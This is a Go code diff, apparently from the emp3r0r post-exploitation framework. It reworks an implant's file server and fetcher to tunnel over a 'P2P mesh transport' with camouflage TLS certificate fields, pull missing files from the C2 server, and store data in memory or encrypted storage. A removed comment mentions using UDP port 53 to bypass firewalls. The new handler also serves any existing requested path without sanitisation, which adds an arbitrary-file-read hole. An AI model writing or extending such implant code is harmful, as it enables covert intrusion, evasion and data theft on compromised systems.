@@ -189,21 +189,19 @@ var (
 	FileServerCancel context.CancelFunc
 )
 
-// FileServer hosts files on an HTTP server with AES-GCM encryption in stream mode
+// FileServer hosts files on an HTTP server over P2P mesh transport
 func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err error) {
 	defer cancel()
 
-	// start HTTP server on local interface on port-1
+	// start HTTP server on local interface on a random port
 	http_port := util.RandInt(10000, 60000)
 	listen_addr := fmt.Sprintf("127.0.0.1:%d", http_port)
 	http.HandleFunc("/", handleClient)
 	server := &http.Server{Addr: listen_addr}
 
-	// start KCP tunnel server that forwards to HTTP server
-	// the KCP server will listen on user's specified port while the HTTP server listens on a random port
-	// common ports such as UDP 53 can be specified to bypass firewall
+	// start P2P tunnel server using P2P mesh transport that forwards to HTTP server
 	portstr := fmt.Sprintf("%d", port)
-	go transport.KCPTunServer(listen_addr, portstr, common.RuntimeConfig.Password, def.MagicString, ctx, cancel)
+	go transport.P2PTunServer(listen_addr, portstr, common.RuntimeConfig.Password, def.MagicString, common.RuntimeConfig.P2PTransport, common.RuntimeConfig.CamouflageCertOrg, common.RuntimeConfig.CamouflageCertCN, ctx, cancel)
 
 	go func() {
 		defer func() {
@@ -215,7 +213,7 @@ func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err e
 		server.Close()
 	}()
 
-	logging.Infof("HTTP secure file server started on port %d", port)
+	logging.Infof("HTTP secure file server started on port %d using %s P2P transport", port, common.RuntimeConfig.P2PTransport)
 	err = server.ListenAndServe()
 	if err != nil && err != http.ErrServerClosed {
 		return fmt.Errorf("FileServer: failed to start HTTP server: %v", err)
@@ -228,59 +226,70 @@ func handleClient(w http.ResponseWriter, r *http.Request) {
 	file_path := r.URL.Query().Get("file_path")
 	checksum := r.URL.Query().Get("checksum")
 
-	// sanitize path to prevent traversal
-	basename := util.FileBaseName(file_path)
-	if basename == "" {
+	if file_path == "" {
 		http.Error(w, "Invalid file path", http.StatusBadRequest)
 		return
 	}
-	safe_path := filepath.Join(os.TempDir(), basename)
 
-	// if file does not exist, download it from CC
-	if !util.IsFileExist(safe_path) {
-		logging.Infof("handleClient: file %s (%s) does not exist, downloading from CC", safe_path, checksum)
-		_, err := DownloadViaC2(common.RuntimeConfig, file_path, safe_path, checksum)
-		if err != nil {
-			logging.Infof("handleClient: failed to download file from CC: %v", err)
-			http.Error(w, "Failed to download file from CC", http.StatusInternalServerError)
+	target_path := file_path
+
+	// 1. Check if the file exists in memfs or on disk
+	if !util.IsFileExist(file_path) {
+		// Prevent path traversal for disk fallback paths
+		basename := util.FileBaseName(file_path)
+		if basename == "" {
+			http.Error(w, "Invalid file path", http.StatusBadRequest)
 			return
 		}
-		file_path = safe_path // should serve the downloaded file
-	} else {
-		file_path = safe_path
+		safe_path := filepath.Join(os.TempDir(), basename)
+
+		if !util.IsFileExist(safe_path) {
+			logging.Infof("handleClient: file %s (%s) does not exist in memfs or disk, downloading from C2", safe_path, checksum)
+			_, err := DownloadViaC2(common.RuntimeConfig, file_path, safe_path, checksum)
+			if err != nil {
+				logging.Infof("handleClient: failed to download file from C2: %v", err)
+				http.Error(w, "Failed to download file from C2", http.StatusInternalServerError)
+				return
+			}
+			target_path = safe_path
+		} else {
+			target_path = safe_path
+		}
 	}
 
-	// serve the file
-	// http.ServeFile(w, r, file_path)
-	// We use ReadFileAgent to support memory files and transparent encryption
-	data, err := util.ReadFileAgent(file_path)
+	// 2. Read file content using ReadFileAgent (handles memfs and encrypted storage)
+	data, err := util.ReadFileAgent(target_path)
 	if err != nil {
-		logging.Infof("handleClient: failed to read file %s: %v", file_path, err)
+		logging.Infof("handleClient: failed to read file %s: %v", target_path, err)
 		http.Error(w, "Failed to read file", http.StatusInternalServerError)
 		return
 	}
-	// ServeContent handles Range requests etc.
-	http.ServeContent(w, r, util.FileBaseName(file_path), time.Now(), bytes.NewReader(data))
+
+	// 3. Serve file content
+	http.ServeContent(w, r, util.FileBaseName(target_path), time.Now(), bytes.NewReader(data))
 }
 
-// FetchFileKCP requests and downloads a file from an HTTP server to a specified path
+// FetchFileKCP requests and downloads a file from a P2P server to a specified path via P2P mesh transport
 func FetchFileKCP(address, filepath, path, checksum string) (err error) {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// start local KCP client tunnel to connect to KCP server then HTTP server
-	kcp_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 50000))
-	go transport.KCPTunClient(address, kcp_listen_port, common.RuntimeConfig.Password, def.MagicString, ctx, cancel)
+	// start local P2P client tunnel to connect to P2P server then HTTP server
+	p2p_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 50000))
+	go transport.P2PTunClient(address, p2p_listen_port, common.RuntimeConfig.Password, def.MagicString, common.RuntimeConfig.P2PTransport, common.RuntimeConfig.CamouflageCertOrg, common.RuntimeConfig.CamouflageCertCN, ctx, cancel)
 
 	// wait until port is open
-	for !netutil.IsPortOpen("127.0.0.1", kcp_listen_port) {
-		logging.Infof("RequestAndDownloadFile: waiting for port %s to open", kcp_listen_port)
+	for !netutil.IsPortOpen("127.0.0.1", p2p_listen_port) {
+		logging.Infof("RequestAndDownloadFile: waiting for port %s to open", p2p_listen_port)
 		time.Sleep(time.Second)
 	}
 
-	// use grab to download the file
+	// use grab to download to a temporary disk path first
+	tempFile := fmt.Sprintf("%s/emp3r0r_dl_%d", os.TempDir(), util.RandInt(10000, 99999))
+	defer os.Remove(tempFile)
+
 	client := grab.NewClient()
-	req, err := grab.NewRequest(path, fmt.Sprintf("http://127.0.0.1:%s/?file_path=%s&checksum=%s", kcp_listen_port, url.QueryEscape(filepath), url.QueryEscape(checksum)))
+	req, err := grab.NewRequest(tempFile, fmt.Sprintf("http://127.0.0.1:%s/?file_path=%s&checksum=%s", p2p_listen_port, url.QueryEscape(filepath), url.QueryEscape(checksum)))
 	if err != nil {
 		return fmt.Errorf("RequestAndDownloadFile: failed to create grab request: %v", err)
 	}
@@ -299,11 +308,24 @@ func FetchFileKCP(address, filepath, path, checksum string) (err error) {
 
 			// if checksum is given, check it
 			if checksum != "" {
-				if checksum != crypto.SHA256SumFile(path) {
-					return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", crypto.SHA256SumFile(path), checksum)
+				if checksum != crypto.SHA256SumFile(tempFile) {
+					return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", crypto.SHA256SumFile(tempFile), checksum)
 				}
 			}
-			logging.Infof("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, resp.Size())
+
+			// Read downloaded data from temp file
+			data, err := os.ReadFile(tempFile)
+			if err != nil {
+				return fmt.Errorf("RequestAndDownloadFile read downloaded bytes: %v", err)
+			}
+
+			// Save via WriteFileAgent to support mem:/// and encrypted disk storage
+			err = util.WriteFileAgent(path, data, 0o600)
+			if err != nil {
+				return fmt.Errorf("RequestAndDownloadFile write via WriteFileAgent: %v", err)
+			}
+
+			logging.Infof("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, len(data))
 			return nil
 		case <-t.C:
 			logging.Infof("%.02f%% complete at %.02f KB/s", resp.Progress()*100, resp.BytesPerSecond()/1024)
